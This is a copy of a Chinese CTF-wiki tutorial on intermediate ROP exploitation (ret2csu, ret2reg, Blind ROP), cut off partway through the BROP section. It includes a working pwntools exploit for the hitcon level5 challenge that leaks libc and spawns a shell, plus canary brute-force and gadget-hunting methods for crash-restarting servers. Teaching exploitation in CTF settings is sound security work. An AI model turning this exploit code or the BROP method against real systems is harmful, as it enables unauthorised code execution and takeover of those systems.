---
ingested: true
ingestedAt: 2026-05-15
---
标题: 中级 ROP
来源: https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/
提取方式: WebFetch
内容:
# 中级 ROP

中级 ROP 主要是使用了一些比较巧妙的 Gadgets。

## ret2csu

### 原理 

在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)

```
.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 __libc_csu_init endp 
```
这里我们可以利用以下几点

- 从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。

- 从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，**但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）** ，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。

- 从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。

### 示例 

这里我们以 hitcon [level5](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/ret2__libc_csu_init/hitcon-level5) 为例进行介绍。首先检查程序的安全保护

```
➜  ret2__libc_csu_init git:(iromise) ✗ checksec level5         
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabledd
    PIE:      No PIE (0x400000) 
```
程序为 64 位，开启了堆栈不可执行保护。

其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出

```
ssize_t vulnerable_function() {
    char buf; // [sp+0h] [bp-80h]@1
    return read(0, &buf, 0x200uLL);
} 
```
简单浏览下程序，发现程序中既没有 system 函数地址，也没有 /bin/sh 字符串，所以两者都需要我们自己去构造了。

**注：这里我尝试在我本机使用 system 函数来获取 shell 失败了，应该是环境变量的问题，所以这里使用的是 execve 来获取 shell。**

基本利用思路如下

- 利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址，并使得程序重新执行 main 函数

- 根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址

- 再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 '/bin/sh’ 地址，并使得程序重新执行 main 函数。

- 再次利用栈溢出执行 libc_csu_gadgets 执行 execve('/bin/sh') 获取 shell。

exp 如下

```python
from pwn import * 
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  
level5 = ELF('./level5') 
sh = process('./level5') 
write_got = level5.got['write'] 
read_got = level5.got['read'] 
main_addr = level5.symbols['main'] 
bss_base = level5.bss() 
csu_front_addr = 0x0000000000400600 
csu_end_addr = 0x000000000040061A 
fakeebp = b'b' * 8 

def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = b'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    time.sleep(1) 

sh.recvuntil(b'Hello, World\n') 
csu(0, 1, write_got, 8, write_got, 1, main_addr) 
write_addr = u64(sh.recv(8)) 
log.info(f"Leaked write address: {hex(write_addr)}") 
libc_base = write_addr - libc.symbols['write'] 
log.success(f"Libc base address: {hex(libc_base)}") 
execve_addr = libc_base + libc.symbols['execve'] 
log.success(f"Execve address: {hex(execve_addr)}") 
sh.recvuntil(b'Hello, World\n') 
csu(0, 1, read_got, 16, bss_base, 0, main_addr) 
sh.send(p64(execve_addr) + b'/bin/sh\x00') 
sh.recvuntil(b'Hello, World\n') 
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr) 
sh.interactive() 
```
### 思考 

#### 改进 

在上面的时候，我们直接利用了这个通用 gadgets，其输入的字节长度为 128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法

##### 改进 1 - 提前控制 rbx 与 rbp

可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足 cmp 的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少 16 字节，即我们所需的字节数只需要 112。

##### 改进 2 - 多次利用 

其实，改进 1 也算是一种多次利用。我们可以看到我们的 gadgets 是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次 gadgets 所需要的字节数。但这里的多次利用需要更加严格的条件

- 漏洞可以被多次触发

- 在两次触发之间，程序尚未修改 r12-r15 寄存器，这是因为要两次调用。

**当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。**

#### gadget

其实，除了上述这个 gadgets，gcc 默认还会编译进去一些其它的函数

```
_init
_start
call_gmon_start
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
frame_dummy
__libc_csu_init
__libc_csu_fini
_fini
```
我们也可以尝试利用其中的一些代码来进行执行。此外，由于 PC 本身只是将程序的执行地址处的数据传递给 CPU，而 CPU 则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。

需要一说的是，在上面的 libc_csu_init 中我们主要利用了以下寄存器

- 利用尾部代码控制了 rbx，rbp，r12，r13，r14，r15。

- 利用中间部分的代码控制了 rdx，rsi，edi。

而其实 libc_csu_init 的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A 是正常的起始地址，**可以看到我们在 0x000000000040061f 处可以控制 rbp 寄存器，在 0x0000000000400621 处可以控制 rsi 寄存器。** 而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下。

```
gef➤  x/5i 0x000000000040061A
   0x40061a <__libc_csu_init+90>:   pop    rbx
   0x40061b <__libc_csu_init+91>:   pop    rbp
   0x40061c <__libc_csu_init+92>:   pop    r12
   0x40061e <__libc_csu_init+94>:   pop    r13
   0x400620 <__libc_csu_init+96>:   pop    r14
gef➤  x/5i 0x000000000040061b
   0x40061b <__libc_csu_init+91>:   pop    rbp
   0x40061c <__libc_csu_init+92>:   pop    r12
   0x40061e <__libc_csu_init+94>:   pop    r13
   0x400620 <__libc_csu_init+96>:   pop    r14
   0x400622 <__libc_csu_init+98>:   pop    r15
gef➤  x/5i 0x000000000040061A+3
   0x40061d <__libc_csu_init+93>:   pop    rsp
   0x40061e <__libc_csu_init+94>:   pop    r13
   0x400620 <__libc_csu_init+96>:   pop    r14
   0x400622 <__libc_csu_init+98>:   pop    r15
   0x400624 <__libc_csu_init+100>:  ret
gef➤  x/5i 0x000000000040061e
   0x40061e <__libc_csu_init+94>:   pop    r13
   0x400620 <__libc_csu_init+96>:   pop    r14
   0x400622 <__libc_csu_init+98>:   pop    r15
   0x400624 <__libc_csu_init+100>:  ret
   0x400625:    nop
gef➤  x/5i 0x000000000040061f
   0x40061f <__libc_csu_init+95>:   pop    rbp
   0x400620 <__libc_csu_init+96>:   pop    r14
   0x400622 <__libc_csu_init+98>:   pop    r15
   0x400624 <__libc_csu_init+100>:  ret
   0x400625:    nop
gef➤  x/5i 0x0000000000400620
   0x400620 <__libc_csu_init+96>:   pop    r14
   0x400622 <__libc_csu_init+98>:   pop    r15
   0x400624 <__libc_csu_init+100>:  ret
   0x400625:    nop
   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]
gef➤  x/5i 0x0000000000400621
   0x400621 <__libc_csu_init+97>:   pop    rsi
   0x400622 <__libc_csu_init+98>:   pop    r15
   0x400624 <__libc_csu_init+100>:  ret
   0x400625:    nop
gef➤  x/5i 0x000000000040061A+9
   0x400623 <__libc_csu_init+99>:   pop    rdi
   0x400624 <__libc_csu_init+100>:  ret
   0x400625:    nop
   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]
   0x400630 <__libc_csu_fini>:  repz ret 
```
### 题目 

- 2016 XDCTF pwn100

- 2016 华山杯 SU_PWN

### 参考阅读 

- [http://drops.xmd5.com/static/drops/papers-7551.html](http://drops.xmd5.com/static/drops/papers-7551.html)

- [http://drops.xmd5.com/static/drops/binary-10638.html](http://drops.xmd5.com/static/drops/binary-10638.html)

## ret2reg

### 原理 

1. 查看溢出函返回时哪个寄存值指向溢出缓冲区空间

2. 然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址

3. reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)

## JOP

Jump-oriented programming

## COP

Call-oriented programming

## BROP

### 基本介绍 

BROP(Blind ROP) 于 2014 年由 Standford 的 Andrea Bittau 提出，其相关研究成果发表在 Oakland 2014，其论文题目是 **Hacking Blind** ，下面是作者对应的 paper 和 slides, 以及作者相应的介绍

- [paper](http://www.scs.stanford.edu/brop/bittau-brop.pdf)

- [slide](http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf)

BROP 是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。

### 攻击条件 

1. 源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。

2. 服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。

### 攻击原理 

目前，大部分应用都会开启 ASLR、NX、Canary 保护。这里我们分别讲解在 BROP 中如何绕过这些保护，以及如何进行攻击。

#### 基本思路 

在 BROP 中，基本的遵循的思路如下

- 判断栈溢出长度

    - 暴力枚举

- Stack Reading

    - 获取栈上的数据来泄露 canaries，以及 ebp 和返回地址。

- Blind ROP

    - 找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。

- Build the exploit

    - 利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。

#### 栈溢出长度 

直接从 1 暴力枚举即可，直到发现程序崩溃。

#### Stack Reading

如下所示，这是目前经典的栈布局

```
buffer|canary|saved fame pointer|saved returned address
```
要向得到 canary 以及之后的变量，我们需要解决第一个问题，如何得到 overflow 的长度，这个可以通过不断尝试来获取。

其次，关于 canary 以及后面的变量，所采用的的方法一致，这里我们以 canary 为例。

canary 本身可以通过爆破来获取，但是如果只是愚蠢地枚举所有的数值的话，显然是低效的。

需要注意的是，攻击条件 2 表明了程序本身并不会因为 crash 有变化，所以每次的 canary 等值都是一样的。所以我们可以按照字节进行爆破。正如论文中所展示的，每个字节最多有 256 种可能，所以在 32 位的情况下，我们最多需要爆破 1024 次，64 位最多爆破 2048 次。

#### Blind ROP

##### 基本思路 

最朴素的执行 write 函数的方法就是构造系统调用。

```
pop rdi; ret # socket
pop rsi; ret # buffer
pop rdx; ret # length
pop rax; ret # write syscall number
syscall
```
但通常来说，这样的方法都是比较困难的，因为想要找到一个 syscall 的地址基本不可能。。。我们可以通过转换为找 write 的方式来获取。

###### BROP gadgets

首先，在 libc_csu_init 的结尾一长串的 gadgets，我们可以通过偏移来获取 write 函数调用的前两个参数。

###### find a call write

我们可以通过 plt 表来获取 write 的地址。

###### control rdx

需要注意的是，rdx 只是我们用来输出程序字节长度的变量，只要不为 0 即可。一般来说程序中的 rdx 经常性会不是零。但是为了更好地控制程序输出，我们仍然尽量可以控制这个值。但是，在程序中 `pop rdx; ret` 这样的指令几乎没有。那么，我们该如何控制 rdx 的数值呢？这里需要说明执行 strcmp 的时候，rdx 会被设置为将要被比较的字符串的长度，所以我们可以找到 strcmp 函数，从而来控制 rdx。

那么接下来的问题，我们就可以分为两项

- 寻找 gadgets

- 寻找 PLT 表

    - write 入口

    - strcmp 入口

##### 寻找 gadgets

首先，我们来想办法寻找 gadgets。此时，由于尚未知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的 gadgets。而当我们控制程序的返回地址时，一般有以下几种情况

- 程序直接崩溃

- 程序运行一段时间后崩溃

- 程序一直运行而并不崩溃

为了寻找合理的 gadgets，我们可以分为以下两步

###### 寻找 stop gadgets

所谓`stop gadget`一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，
